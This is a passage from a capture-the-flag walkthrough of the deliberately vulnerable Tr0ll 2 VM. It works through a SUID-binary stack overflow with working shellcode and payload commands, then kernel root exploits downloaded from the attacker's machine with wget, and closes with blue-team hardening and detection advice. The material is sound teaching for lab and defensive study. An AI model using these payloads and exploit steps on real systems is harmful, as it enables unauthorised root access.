> **Always re-check before you exploit:**
> ```bash
> for d in 1 2 3; do
>   f=/nothing_to_see_here/choose_wisely/door$d/file
>   printf "door%s  %6s bytes  " "$d" "$(stat -c%s "$f")"
>   echo "$f"
> done | sort -k2 -n
> ```
> ```text
> door2     5150 bytes  /nothing_to_see_here/choose_wisely/door2/file
> door1     7370 bytes  /nothing_to_see_here/choose_wisely/door1/file
> door3     7370 bytes  /nothing_to_see_here/choose_wisely/door3/file
> ```
>
> **And read `ran_dir.py`** if you can (as root later) — understanding the author's
> own tooling is the fastest way to understand a box's design.

### 5.2 Confirm the vulnerability class

```bash
noob@Tr0ll2:~$ file /nothing_to_see_here/choose_wisely/door2/file
/nothing_to_see_here/choose_wisely/door2/file: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=a1b2c3..., not stripped
```

```bash
noob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door2/file $(python -c 'print "A"*500')
Segmentation fault (core dumped)
```

> **Key facts from `file`:**
> - **`setuid`** → runs as root.
> - **`ELF 32-bit LSB`** → x86, **little-endian**. Our addresses and shellcode must
>   be 32-bit; 64-bit shellcode will crash.
> - **`dynamically linked, interpreter /lib/ld-linux.so.2`** → uses libc.
> - **`not stripped`** → **symbols are present**, so `gdb` will show us `main` by
>   name. Huge convenience.
>
> **Crash on 500 A's = stack buffer overflow.** Time for § 6.

![SUID binaries in the three doors](images/06-suid.png)

---

## 6. Privilege escalation — a manual buffer overflow

Work slowly. This is the part that separates "runs exploits" from "writes exploits".

### 6.1 The stack, for beginners

```text
  high addresses  ┌──────────────────────────┐
                  │  environment strings     │
                  │  argv[]                  │
                  ├──────────────────────────┤
                  │  saved EIP  (return addr)│  ← 4 bytes we must control
                  ├──────────────────────────┤
                  │  saved EBP               │  ← 4 bytes of padding
                  ├──────────────────────────┤
                  │  char buffer[N]          │  ← N bytes of padding
                  └──────────────────────────┘
  low addresses     (stack grows DOWNWARD)

                  ESP ──► top of stack, points at our payload
```

- **EIP** (instruction pointer) holds the address of the next instruction. When
  `main()` returns, the CPU pops the **saved EIP** and jumps there.
- **ESP** (stack pointer) points at the current top of the stack — which, at the
  moment of the return, is *our* buffer.
- If we write past the end of `buffer`, we overwrite saved EBP and then saved EIP.
  **Whoever controls saved EIP controls the program.**

Our payload layout:

```text
[ padding: offset bytes ] [ new EIP: address of "jmp esp" ] [ NOP sled ] [ shellcode ]
                                                          ▲
                                                          ESP points here
```

The CPU returns to `jmp esp`, which jumps to ESP — straight into our sled. The sled
(`0x90` = x86 NOP, "do nothing") absorbs the imprecision of not knowing ESP exactly:
landing anywhere in it slides harmlessly into the shellcode.

### 6.2 Find the offset with a cyclic pattern

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500 > pattern.txt
wc -c pattern.txt
```

```text
500 pattern.txt
```

```bash
noob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door2/file "$(cat pattern.txt)"
Segmentation fault (core dumped)
noob@Tr0ll2:~$ dmesg | tail -2
[ 3421.882114] file[5812]: segfault at 37654136 ip 0000000037654136 sp 00000000bffffb70 error 14 in file[8048000+1000]
```

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 37654136
```

```text
[*] Exact match at offset 268
```

> **How a cyclic pattern works:** `Aa0Aa1Aa2…` is constructed so that **every
> 4-byte window is unique.** When the crash reports `ip 0x37654136`, that value is
> four of our characters in little-endian order (`6`, `A`, `5`, `7` → `36 41 35 37`).
> `pattern_offset` looks that window up in the pattern and reports its position:
> **268**. So 268 bytes of padding reach the saved EIP exactly.
>
> **`dmesg` is the fastest way to read a crash** without a debugger. Decode the line:
> - `ip 0000000037654136` → the overwritten instruction pointer.
> - `sp 00000000bffffb70` → **the stack pointer.** We need an address near this.
> - `error 14` → page-fault code: user mode, instruction fetch, page not present.
>   Exactly what happens when EIP points at garbage.
> - `in file[8048000+1000]` → the binary is loaded at base **`0x08048000`**, size
>   `0x1000`. **Fixed base ⇒ no PIE ⇒ gadget addresses are stable.** That is why this
>   overflow is possible at all.

### 6.3 Confirm exact EIP control

```bash
noob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door2/file $(python -c 'print "A"*268 + "BBBB"')
Segmentation fault (core dumped)
noob@Tr0ll2:~$ dmesg | tail -1
[ 3488.114002] file[5881]: segfault at 42424242 ip 0000000042424242 sp 00000000bffffb70 error 14 in file[8048000+1000]
```

> **`ip 0000000042424242` — four `B`s (`0x42`).** We control EIP precisely. This is
> the milestone.

### 6.4 Find a `jmp esp` gadget

```bash
noob@Tr0ll2:~$ objdump -D /nothing_to_see_here/choose_wisely/door2/file | grep -E 'jmp\s+\*?%esp|call\s+\*?%esp'
```

```text
  80484af:	ff e4                	jmp    *%esp
```

> **`0x080484af` contains `ff e4` = `jmp esp`.** It is inside the binary itself
> (`8048000+1000` range), which is loaded at a fixed address because the program is
> **not PIE**. So this address is the same on every run.
>
> **Why `jmp esp` rather than a hard-coded stack address?** The stack address varies
> with the environment size, the invocation path, and ASLR. `jmp esp` is *relative*:
> "execute whatever is at the top of the stack right now" — which is our payload. It
> converts an unpredictable absolute address into a reliable indirection. This is the
> single most important trick in classic stack exploitation.
>
> **Little-endian encoding:** x86 stores integers least-significant byte first.
> `0x080484af` → bytes `af 84 04 08`. In a Python string that is `"\xaf\x84\x04\x08"`.
> **Getting this backwards is the #1 beginner mistake.**

### 6.5 Deal with the environment problem (the part everyone gets wrong)

The ESP we saw in `dmesg` (`0xbffffb70`) came from a run in *our interactive shell*.
But ESP depends on **how much environment and argument data the loader pushed onto
the stack before `main`**. Different invocation → different ESP → your carefully
computed address misses.

Two fixes, both standard:

**Fix 1 — normalise the environment with `env -`:**

```bash
noob@Tr0ll2:~$ env - /nothing_to_see_here/choose_wisely/door2/file $(python -c 'print "A"*500')
Segmentation fault (core dumped)
noob@Tr0ll2:~$ dmesg | tail -1
[ 3552.440187] file[5944]: segfault at 37654136 ip 0000000037654136 sp 00000000bffffc70 error 14 in file[8048000+1000]
```

> **`env -`** runs the program with an **empty environment**. That removes `LS_COLORS`,
> `PWD`, `SHELL`, `LINES`, `COLUMNS`, etc. — the biggest source of stack-address
> drift. Now ESP is reproducible.
>
> Note ESP moved from `0xbffffb70` to **`0xbffffc70`** — a **256-byte** shift purely
> from clearing the environment. That is exactly the kind of thing that turns a
> "working" exploit into a segfault.

**Fix 2 — verify inside gdb and adjust:**

```bash
noob@Tr0ll2:~$ gdb -q /nothing_to_see_here/choose_wisely/door2/file
```

```text
Reading symbols from /nothing_to_see_here/choose_wisely/door2/file...(no debugging symbols found)...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048456 <+0>:	push   %ebp
   0x08048457 <+1>:	mov    %esp,%ebp
   0x08048459 <+3>:	sub    $0x118,%esp
   ...
   0x08048497 <+65>:	mov    0xc(%ebp),%eax
   0x0804849a <+68>:	add    $0x4,%eax
   0x0804849d <+71>:	mov    (%eax),%eax
   0x0804849f <+73>:	mov    %eax,0x4(%esp)
   0x080484a3 <+77>:	lea    -0x108(%ebp),%eax
   0x080484a9 <+83>:	mov    %eax,(%esp)
   0x080484ac <+86>:	call   0x8048320 <strcpy@plt>
   0x080484b1 <+91>:	leave
   0x080484b2 <+92>:	ret
End of assembler code for function main.
```

> **`main+86` calls `strcpy@plt`.** `strcpy` copies a NUL-terminated string with **no
> length check whatsoever** into a 0x108-byte (264-byte) stack buffer. That is the
> vulnerability, in one instruction. (`sub $0x118,%esp` reserves 280 bytes of frame;
> the buffer is 264 of them, leaving saved EBP and saved EIP right after — which is
> why our offset came out to 268 = 264 + 4.)
>
> ```gdb
> (gdb) break main
> (gdb) run $(python -c 'print "A"*268 + "BBBB"')
> (gdb) x/40wx $esp
> (gdb) info registers eip esp
> eip            0x42424242       0x42424242
> esp            0xbffffb90       0xbffffb90
> ```
>
> **gdb's ESP differs from the real run's ESP** because gdb adds its own environment.
> This is precisely why published walkthroughs report "illegal instruction" on the
> first attempt and then nudge the address by 16 or 32 bytes. **Iterate.**

### 6.6 Generate the shellcode

```bash
msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00\x0a\x0d' -f python -v shellcode
```

```text
[-] No platform was selected, choosing Msf::Module::Payload::Cmd::Generic from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of python file: 343 bytes
shellcode =  ""
shellcode += "\xbb\x9a\x62\x04\x07\xd9\xee\xd9\x74\x24\xf4\x5e\x31"
shellcode += "\xc9\xb1\x0b\x31\x5e\x12\x03\x5e\x12\x83\xee\xfc\xe0"
...
```

> **`msfvenom` flags:**
> - `-p linux/x86/exec CMD=/bin/sh` → **32-bit Linux** payload that `exec`s `/bin/sh`.
>   Must be `x86`, not `x64` — the binary is 32-bit (§ 5.2).
> - `-b '\x00\x0a\x0d'` → **bad characters** the encoder must avoid.
>   `0x00` (NUL) terminates `strcpy`, so it would truncate our payload. `0x0a` (LF)
>   and `0x0d` (CR) break shell argument handling.
> - `-f python -v shellcode` → emit as a Python variable.
> - `x86/shikata_ga_nai` → a polymorphic XOR encoder. It exists mainly to satisfy the
>   bad-character constraint here (and historically to evade AV signatures).
>
> **Or use the classic hand-written 28-byte `execve("/bin/sh")`, which has no NULs at
> all and needs no encoder:**
> ```text
> \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
> ```
> Disassembled:
> ```asm
> 31 c0           xor    eax, eax          ; eax = 0
> 50              push   eax               ; NUL terminator
> 68 2f 2f 73 68  push   0x68732f2f        ; "//sh"
> 68 2f 62 69 6e  push   0x6e69622f        ; "/bin"
> 89 e3           mov    ebx, esp          ; ebx -> "/bin//sh"
> 50              push   eax               ; argv[1] = NULL
> 53              push   ebx               ; argv[0] = "/bin//sh"
> 89 e1           mov    ecx, esp          ; ecx -> argv[]
> b0 0b           mov    al, 0x0b          ; syscall 11 = execve
> cd 80           int    0x80              ; execve("/bin//sh", argv, NULL)
> ```

### 6.7 Fire it

```bash
noob@Tr0ll2:~$ env - /nothing_to_see_here/choose_wisely/door2/file $(python -c '
import sys
padding   = "A"*268
jmpesp    = "\xaf\x84\x04\x08"      # 0x080484af, little-endian
nopsled   = "\x90"*64
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
             "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
sys.stdout.write(padding + jmpesp + nopsled + shellcode)
')
```

```text
# id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
# whoami
root
# cd /root
# ls -alh
total 80K
drwx------ 11 root   root   4.0K Oct 14  2014 .
drwxr-xr-x 23 root   root   4.0K Oct  5  2014 ..
-rw-------  1 root   root     67 Oct 14  2014 .bash_history
-rw-r--r--  1 root   root   3.1K Apr 19  2012 .bashrc
-rw-r--r--  1 root   root    140 Apr 19  2012 .profile
-rw-r--r--  1 root   root     66 Oct  5  2014 .selected_editor
drwx------  2 root   root   4.0K Oct  4  2014 .ssh
drwxr-xr-x  2 root   root   4.0K Oct  5  2014 .vim
-rw-------  1 root   root   4.2K Oct 14  2014 .viminfo
-rw-r--r--  1 root   root     68 Oct  6  2014 Proof.txt
drwxr-xr-x  5 root   root   4.0K Oct  4  2014 core1
drwxr-xr-x  5 root   root   4.0K Oct  4  2014 core2
drwxr-xr-x  5 root   root   4.0K Oct  4  2014 core3
drwxr-xr-x  5 root   root   4.0K Oct  4  2014 core4
drwxr-xr-x  2 root   root   4.0K Oct  5  2014 goal
drwxr-xr-x  2 root   root   4.0K Oct  6  2014 hardmode
-rw-r--r--  1 maleus maleus 1.5K Oct  4  2014 lmao.zip
-rw-r--r--  1 root   root    828 Oct  4  2014 ran_dir.py
drwxr-xr-x  2 root   root   4.0K Oct  6  2014 reboot
# cat Proof.txt
You win this time young Jedi...a70354f0258dcc00292c72aab3c8b1e4
```

**Flag captured.** ✅

> **`euid=0(root)` with `uid=1002(noob)`** — this is a **SUID** elevation, not a login
> as root. The *real* UID stays `noob`; the *effective* UID becomes 0. Permission
> checks use the effective UID, so we have full root. (Contrast with a kernel exploit,
> which typically gives you `uid=0(root) gid=0(root)` outright.)
>
> **If you get `Illegal instruction` or a silent segfault instead of a shell**, in
> order of likelihood:
> 1. **ESP drifted.** Widen the NOP sled to 128–256 bytes and sweep the address:
>    ```bash
>    for esp in 0xbffffb00 0xbffffb40 0xbffffb80 0xbffffbc0 0xbffffc00 0xbffffc40 0xbffffc80; do
>      echo "trying $esp"
>      env - /nothing_to_see_here/choose_wisely/door2/file \
>        $(python -c "import sys;sys.stdout.write('A'*268 + '$esp'.decode('hex')[::-1] + '\x90'*128 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')")
>      sleep 1
>    done
>    ```
> 2. **The binary moved doors.** Re-run the size check from § 5.1 — 5150 bytes.
> 3. **Endianness.** `af 84 04 08`, never `08 04 84 af`.
> 4. **A bad character slipped in.** Re-encode with `-b '\x00\x0a\x0d'`.
> 5. **You invoked it differently** than the run you measured ESP from. Use `env -`
>    consistently in *both* the measurement and the exploit.
>
> Also note `/root/ran_dir.py`, `/root/hardmode`, `/root/reboot`, `core1..core4` and
> `/root/goal` — the author's machinery for the trolling. Read `ran_dir.py` to see
> exactly how the doors rotate.

![Buffer overflow yielding euid=0 and Proof.txt](images/07-bof.png)

---

## 7. Alternative privilege-escalation paths

Worth knowing, even though the buffer overflow is the intended one.

### 7.1 Kernel exploit (Ubuntu 14.04, 3.13.0-32, i386)

```bash
noob@Tr0ll2:~$ uname -r
3.13.0-32-generic
```

```bash
searchsploit ubuntu 14.04 local
```

```text
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Esc     | linux/local/37292.c
Linux Kernel 3.19.0-25 < 3.19.0-43 (Ubuntu 14.04/15.04) - 'overlayfs' Local Privilege Escalation   | linux/local/39166.c
--------------------------------------------------------------------------------------------------- ---------------------------------
```

`37292.c` covers `3.13.0 < 3.19`, so it applies:

```bash
# Kali
searchsploit -m linux/local/37292.c && python3 -m http.server 8000
# target
noob@Tr0ll2:/tmp$ wget http://192.168.56.10:8000/37292.c -O ofs.c
noob@Tr0ll2:/tmp$ gcc ofs.c -o ofs && ./ofs
spawnining threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1002(noob)
```

> CVE-2015-1328 (overlayfs) is far less fiddly than the buffer overflow, and on most
> revisions of this box it works. Try it first if you want a quick win — but **do the
> overflow anyway**, because that is the skill this box exists to teach.

### 7.2 Dirty COW (CVE-2016-5195)

Kernel 3.13.0-32 is within the Dirty COW range:

```bash
# Kali
cp /usr/share/exploitdb/exploits/linux/local/40847.c .
python3 -m http.server 8000
# target
noob@Tr0ll2:/tmp$ wget http://192.168.56.10:8000/40847.c -O dirty.c
noob@Tr0ll2:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
noob@Tr0ll2:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fiXGm0pQ6zZ.2:0:0:pwned:/root:/bin/bash

mmap: b7f4a000
madvise 0
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.
DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
noob@Tr0ll2:/tmp$ su firefart
# id
uid=0(root) gid=0(root) groups=0(root)
```

> `40847` is the `PTRACE_POKEDATA` variant, which works on 32-bit x86; `40839` is the
> 64-bit one. **`-pthread` and `-lcrypt` are required** (POSIX threads and `crypt()`).
> Always restore `/etc/passwd` afterwards.

### 7.3 `r00t`'s siblings — the decoys

The two 7370-byte binaries are traps, and understanding them is part of the lesson:

| Binary behaviour | Effect | Lesson |
| --- | --- | --- |
| Reboots the machine immediately | You lose your session | Snapshot before running unknown SUID binaries |
| Locks you out for ~2 minutes | Session killed, brief lockout | Same |
| Prints a joke / "you chose poorly" | Nothing | Keep enumerating |

> **Operational rule: take a VM snapshot before running any unknown SUID binary.** In a
> lab this costs nothing; on a production system, running an untested binary as root
> could reboot a database.

---

## 8. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Sensitive hint in an HTML comment | `/index.html` | FTP credentials `Tr0ll:Tr0ll` |
| 2 | `robots.txt` discloses 15 paths | `/robots.txt` | Reconnaissance shortcut |
| 3 | Directory indexing enabled | `/images/`, `/y0ur_self/` | File listing, download of `answer.txt` |
| 4 | **Hidden data in image metadata** | JPEG COM marker in the size-outlier image | Disclosed `/y0ur_self` |
| 5 | Weak "encryption" of a wordlist (base64) | `/y0ur_self/answer.txt` | ZIP password recovered |
| 6 | **Anonymous and weak-credential FTP** | ProFTPD 1.3.5rc3, port 21 | Delivered `lmao.zip` |
| 7 | **Password-protected ZIP cracked from a leaked wordlist** | `lmao.zip` | RSA private key for `noob` |
| 8 | **Shellshock — CVE-2014-6271** | bash 4.x via SSH forced command | Remote code execution as `noob` |
| 9 | Private key distributed with no passphrase enforcement | `noob` | Full SSH access |
| 10 | **SUID-root binary with an unbounded `strcpy`** | `/nothing_to_see_here/choose_wisely/door*/file` | EIP control → **root** |
| 11 | No PIE, no stack canary, executable stack | the `r00t` binary | Made the overflow trivially exploitable |
| 12 | Unpatched kernel 3.13.0-32 (CVE-2015-1328, CVE-2016-5195) | Ubuntu 14.04 | Two alternative local-root paths |
| 13 | ProFTPD 1.3.5rc3 — a *release candidate* in production | port 21 | `mod_copy` RCE (CVE-2015-3306) exposure |

## 9. Defensive lessons (blue team)

1. **Patch bash.** Shellshock was fixed in bash 4.3 patch 25 within 24 hours of
   disclosure. `apt-get install --only-upgrade bash`. Then verify:
   ```bash
   env x='() { :;}; echo VULNERABLE' bash -c 'echo patched'
   ```
   Expect only `patched`. Also `apt list --installed | grep bash` and check every
   embedded device, router, printer and IPMI controller — that is where Shellshock
   lingered for years.
2. **Do not rely on `command=` in `authorized_keys` as a security boundary.** It is a
   convenience feature. If you need a restricted user, use a dedicated restricted
   shell (`rbash`, `lshell`, `git-shell`), a chroot/jail, or an application-level
   authorisation layer.
3. **Never deploy SUID-root binaries you wrote.** If you must, then:
   - use `strncpy`/`snprintf`/`strlcpy` with an explicit bound, never `strcpy`;
   - drop privileges immediately: `setresuid(getuid(), getuid(), getuid())` at the
     top of `main` and re-elevate only for the specific operation;
   - validate and canonicalise every argument;
   - compile with `-fstack-protector-strong -D_FORTIFY_SOURCE=2 -pie -fPIE
     -Wl,-z,relro,-z,now -z noexecstack`;
   - and get a second pair of eyes on it.
4. **Enable system-wide exploit mitigations:**
   ```text
   kernel.randomize_va_space = 2      # full ASLR
   ```
   Build everything as PIE. Enforce NX/DEP (`-z noexecstack`). Stack canaries
   (`-fstack-protector-strong`) would have turned this overflow into a clean
   `*** stack smashing detected ***` abort instead of root.
5. **Never run a release candidate in production.** `ProFTPD 1.3.5rc3` is a test
   build. Pin to released versions and subscribe to the vendor's security list.
6. **Disable FTP anonymous access**; prefer SFTP/SCP over FTP entirely. ProFTPD:
   ```
   <Anonymous ~ftp>
       # remove entirely, or:
       RequireValidShell on
       MaxClients 0
   </Anonymous>
   ```
7. **Turn off directory indexing** and never publish `robots.txt` entries that point
   at sensitive material. Apache: `Options -Indexes`. And treat `robots.txt` as a
   public map of your site — because that is exactly what it is.
8. **Strip and scan media metadata.** Every uploaded image should be re-encoded
   (which destroys EXIF/COM markers) before storage. On ingest:
   `exiftool -all= uploaded.jpg`. On egress: run `exiftool` and `strings` over
   published media in CI and alert on non-empty comments.
9. **Do not encode secrets in base64.** Base64 is transport encoding, not
   cryptography. If a "wordlist" of 90 000 items is on your web server, assume it is
   public.
10. **Patch the kernel** and remove `gcc` from production servers — its presence
    turned "shell as `noob`" into "root in two minutes" via overlayfs.
11. **Detection opportunities.**
    - `dmesg`/`/var/log/kern.log`: `segfault … ip <value> … error 14` from a SUID
      binary is a near-perfect exploitation signal. Alert on *any* segfault in a
      setuid executable.
    - SSH: alert on `Remote: Forced command` sessions whose environment contains
      `() {`.
    - auditd: `-a always,exit -F arch=b32 -S execve -F euid=0 -F uid!=0 -k suid_exec`
      catches a non-root user executing anything as effective root.
    - FIM on `/nothing_to_see_here/` — binaries that *change location and size*
      should be tracked, not ignored.
    - `core1..core4` directories in `/root` are core dumps from the author's testing;
      in production, core dumps from setuid binaries are both a detection signal and
      a data-leak risk (`fs.suid_dumpable = 0`).

---

## 10. References

- VulnHub entry: <https://vulnhub.com/entry/tr0ll-2,107/>
- Series: <https://vulnhub.com/series/tr0ll,86/>
- Community writeups consulted:
  - [mohamedaezzat — Tr0ll 2 Vulnhub Walkthrough (buffer overflow detail)](https://mohamedaezzat.github.io/posts/troll2/)
  - [securitybytes — Vulnhub.com Tr0ll2 CTF Walkthrough](https://medium.com/securitybytes/vulnhub-com-tr0ll2-ctf-walkthrough-9993042f8af8)
  - [Hacking Articles — Hack the Tr0ll 2 (Boot2Root Challenge)](https://www.hackingarticles.in/hack-the-tr0ll-2-boot2root-challenge/)
  - [InfoSec Institute — Vulnhub Machines Walkthrough Series: Tr0ll: 2](https://www.infosecinstitute.com/resources/penetration-testing/vulnhub-machines-walkthrough-series-tr0ll-2/)
  - [InfoSec Institute — Troll 2 exploitation walkthrough](https://resources.infosecinstitute.com/topic/troll-2-exploitation-walkthrough)
  - [cyberdharam — Tr0ll: 2 VULNHUB WALKTHROUGH](https://cyberdharam.blogspot.com/2021/10/tr0ll-2-vulnhub-walkthrough.html)
  - [Parzival — Troll 2 Walkthrough](https://parzival604.blogspot.com/2019/08/troll-2-walkthrough.html)
  - [bentrobotlabs — Troll 2 Walkthrough Part 1](https://bentrobotlabs.wordpress.com/2018/03/27/troll-2-walkthrough-part-1/)
  - [kw27w5 — VulnHub: Tr0ll 2 Write-Up](https://medium.com/@kw27w5/vulnhub-tr0ll-2-write-up-b2ca4eecfa7f)
  - [justpentest — Walkthrough Tr0ll 2 VM (Vulnhub)](http://justpentest.blogspot.com/2015/08/walkthrough-tr0ll-2-vm-vulnhub.html)
  - [Doyler — Tr0ll: 2 Walkthrough: You Gotta Pay the Troll Toll](https://www.doyler.net/security-not-included/tr0ll-2-walkthrough)
- Advisories / background:
  - [CVE-2014-6271 — GNU Bash "Shellshock"](https://nvd.nist.gov/vuln/detail/CVE-2014-6271) · [US-CERT TA14-268A](https://www.cisa.gov/news-events/alerts/2014/09/25/gnu-bash-vulnerability)
  - [CVE-2015-1328 — Ubuntu overlayfs LPE](https://nvd.nist.gov/vuln/detail/CVE-2015-1328) · [Exploit-DB 37292](https://www.exploit-db.com/exploits/37292)
  - [CVE-2016-5195 — Dirty COW](https://dirtycow.ninja) · [Exploit-DB 40847 (32-bit)](https://www.exploit-db.com/exploits/40847)
  - [CVE-2015-3306 — ProFTPD mod_copy RCE](https://nvd.nist.gov/vuln/detail/CVE-2015-3306)
  - [smashing the stack for fun and profit — Phrack 49](https://phrack.org/issues/49/14.html)
  - [Corelan — Exploit Writing Tutorial Part 1: Stack Based Overflows](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
  - [Corelan — Part 2: Stack Based Overflows, Jumping to Shellcode](https://www.corelan.be/index.php/2009/07/21/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/)
  - [shell-storm shellcode database](http://shell-storm.org/shellcode/) · [Metasploit pattern_create / pattern_offset](https://docs.metasploit.com/)
  - [`fcrackzip`](http://manpages.ubuntu.com/manpages/noble/man1/fcrackzip.1.html) · [`exiftool`](https://exiftool.org/) · [`binwalk`](https://github.com/ReFirmLabs/binwalk) · [`steghide`](http://steghide.sourceforge.net/)
  - [OpenSSH `authorized_keys` options (`command=`, `no-pty`)](https://man.openbsd.org/sshd#AUTHORIZED_KEYS_FILE_FORMAT)
  - [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

## 11. Screenshot checklist

- [ ] `images/01-nmap.png` — ports 21/22/80 and the `robots.txt` NSE output
- [ ] `images/02-images.png` — `ls -l` showing the size outlier in `/images/`
- [ ] `images/03-base64.png` — decoding `answer.txt` and the unique wordlist
- [ ] `images/04-fcrackzip.png` — `PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL`
- [ ] `images/05-shellshock.png` — the `() { :;};` test and the `noob` shell
- [ ] `images/06-suid.png` — the three doors and the 5150-byte SUID binary
- [ ] `images/07-bof.png` — `pattern_offset` result, the exploit, and `Proof.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
